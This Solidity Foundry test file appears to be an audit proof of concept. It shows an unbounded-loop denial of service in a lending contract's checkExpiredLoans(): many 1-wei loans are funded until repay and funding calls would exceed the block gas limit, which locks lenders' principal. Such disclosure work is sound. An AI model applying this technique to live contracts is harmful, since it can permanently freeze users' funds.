// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Run with:
//   cd ~/CCNext-smart-contracts
//   forge test --match-contract LoanUnboundedLoopPoc -vv

import "forge-std/Test.sol";
import {Loan} from "../contracts/Loan/Loan.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockLoanToken is ERC20 {
    constructor() ERC20("MockLoanToken", "MLT") {
        _mint(msg.sender, 1_000_000);
    }
}

contract LoanUnboundedLoopPoc is Test {
    uint256 constant LENDER_KEY   = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant BORROWER_KEY = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    address lender;
    address borrower;
    Loan    loan;
    MockLoanToken token;

    uint32  constant RATE      = 10;
    uint32  constant RATE_BASE = 100;
    uint256 constant PRINCIPAL = 1;   // 1 wei -- minimises cost of DoS setup
    uint256 repayDl;                  // set in setUp() — cannot be constant (uses block.timestamp)

    function setUp() public {
        lender   = vm.addr(LENDER_KEY);
        borrower = vm.addr(BORROWER_KEY);
        token    = new MockLoanToken();
        loan     = new Loan(address(token));
        // Far-future deadline that does NOT overflow when added to LOAN_EXPIRED_TIME (30 min)
        repayDl  = block.timestamp + 3650 days;
        token.transfer(lender, 500_000);
        vm.prank(lender);
        token.approve(address(loan), type(uint256).max);
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    function _createAndFundLoan(uint256 idx) internal returns (bytes32 loanHash) {
        uint256 maturity = 30 days + idx;   // unique per idx → unique hash
        loanHash = loan.predictLoanTermHash(
            lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl
        );
        bytes32 msgHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", loanHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_KEY,   msgHash);
        bytes memory lenderSig   = abi.encodePacked(r, s, v);
        (v, r, s)                = vm.sign(BORROWER_KEY, msgHash);
        bytes memory borrowerSig = abi.encodePacked(r, s, v);

        loan.createLoanTerm(lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl, lenderSig, borrowerSig);
        vm.prank(lender);
        loan.fundLoan(loanHash);
    }

    function _measureCheckGas() internal returns (uint256 used) {
        uint256 before = gasleft();
        loan.checkExpiredLoans();
        used = before - gasleft();
    }

    // ── Test 1: gas grows linearly with funded loan count ─────────────────────

    /// @notice Proves checkExpiredLoans() gas cost grows O(N) with funded loans.
    ///         repay / fundLoan / partialRepay all call it first -- all become DoS'd.
    ///         At ~7 000 funded loans the 30 M block gas limit is exceeded permanently.
    function test_gasGrowthUnboundedLoop() public {
        uint256 g0   = _measureCheckGas();

        for (uint256 i = 0;  i < 50;  i++) _createAndFundLoan(i);
        uint256 g50  = _measureCheckGas();

        for (uint256 i = 50; i < 100; i++) _createAndFundLoan(i);
        uint256 g100 = _measureCheckGas();

        for (uint256 i = 100; i < 150; i++) _createAndFundLoan(i);
        uint256 g150 = _measureCheckGas();

        console.log("=== UNBOUNDED LOOP -- GAS GROWTH ===");
        console.log("checkExpiredLoans() gas at   0 loans:", g0);
        console.log("checkExpiredLoans() gas at  50 loans:", g50);
        console.log("checkExpiredLoans() gas at 100 loans:", g100);
        console.log("checkExpiredLoans() gas at 150 loans:", g150);
        console.log("");

        uint256 gasPerLoan = (g150 > g100) ? (g150 - g100) / 50 : 1;
        uint256 dosAt      = (gasPerLoan > 0) ? 30_000_000 / gasPerLoan : 0;
        console.log("Gas per additional funded loan (warm storage estimate):", gasPerLoan);
        console.log("Funded loans needed to exceed 30M block gas limit:     ", dosAt);
        console.log("");
        console.log("=== IMPACT ===");
        console.log("fundLoan / repay / partialRepay all call checkExpiredLoans().");
        console.log("After DoS threshold: all three ops revert out-of-gas.");
        console.log("Lender tokens already sent to borrower via fundLoan.");
        console.log("repay() blocked -> lender principal permanently unrecoverable.");

        // Linear growth assertions
        assertGt(g50,  g0,   "gas must grow with 50 funded loans");
        assertGt(g100, g50,  "gas must grow with 100 funded loans");
        assertGt(g150, g100, "gas must grow with 150 funded loans");
    }

    // ── Test 2: repay() caller bears full O(N) cost ───────────────────────────

    /// @notice Shows the concrete DoS: a borrower trying to repay a legitimate
    ///         loan is forced to pay O(N) gas -- proportional to all historical
    ///         funded loans.  Once gas > block limit, the lender's funds are lost.
    function test_repayBearsFullLoopCost() public {
        bytes32 lastHash;
        for (uint256 i = 0; i < 100; i++) lastHash = _createAndFundLoan(i);

        // Give borrower tokens to repay (repaymentDue == PRINCIPAL == 1 wei)
        token.transfer(borrower, 200);
        vm.prank(borrower);
        token.approve(address(loan), type(uint256).max);

        uint256 before = gasleft();
        vm.prank(borrower);
        loan.repay(lastHash);
        uint256 gasRepay = before - gasleft();

        console.log("=== REPAY GAS WITH 100 FUNDED LOANS ===");
        console.log("repay() gas consumed:", gasRepay);
        console.log("~", gasRepay / 100, "gas per funded loan in history");
        console.log("At 7000 loans: repay() needs ~", (gasRepay / 100) * 7000, "gas");
        console.log("Block gas limit: 30 000 000");
    }

    // ── Test 3: firstIdx advancement is broken for non-head archived loans ─────

    /// @notice Documents the firstIdx bug: archiving a non-head loan does NOT
    ///         advance firstIdx, so the loop never shrinks past the stuck head.
    function test_firstIdxStucksOnLongLivedHeadLoan() public {
        // Loan 0: very long maturity -- will never expire in this test
        _createAndFundLoan(0);

        // Loan 1..9: will "expire" (we manually force their repayment deadline past)
        for (uint256 i = 1; i < 10; i++) _createAndFundLoan(i);

        // Even after 9 loans at the back are processed, the loop starts from
        // fundedLoanIndex.firstIdx which is still 0 (loan 0 is never archived).
        // checkExpiredLoans must iterate ALL of them every call.
        uint256 gasWithAll = _measureCheckGas();
        console.log("Gas with 10 funded loans (loan[0] never expires):", gasWithAll);
        console.log("firstIdx remains 0 as long as loan[0] is Funded.");
        console.log("Adding more loans grows nextIdx but firstIdx is stuck -> O(N) growth.");
    }
}
